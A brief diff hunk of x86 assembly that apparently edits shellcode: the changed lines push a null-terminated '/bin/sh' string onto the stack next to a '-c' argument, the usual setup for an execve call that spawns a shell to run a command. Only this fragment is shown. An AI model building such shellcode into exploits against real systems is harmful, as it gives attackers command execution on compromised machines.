@@ -29,9 +29,8 @@ _start:
   push	word 0x632d
   mov	edi, esp
 
-  push	edx
-  push	dword 0x68732f6e
-  push	dword 0x69622f2f
+  push	dword 0x0068732f
+  push	dword 0x6e69622f
   mov	ebx, esp
 
   push	edx
